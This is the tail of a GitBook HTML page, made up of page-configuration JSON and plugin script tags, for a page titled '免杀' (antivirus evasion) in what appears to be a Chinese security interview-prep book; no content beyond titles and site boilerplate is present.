            gitbook.page.hasChanged({"page":{"title":"免杀","level":"7.1","depth":1,"next":{"title":"反病毒/免杀面试题","level":"7.2","depth":1,"path":"neiwang/antikillinter.md","ref":"neiwang/antikillinter.md","articles":[]},"previous":{"title":"逆向基础面试题","level":"6.5.1","depth":2,"ref":"","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["-lunr"],"pluginsConfig":{"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"neiwang/antikill.md","mtime":"2023-06-06T13:40:41.700Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-19T07:29:17.418Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

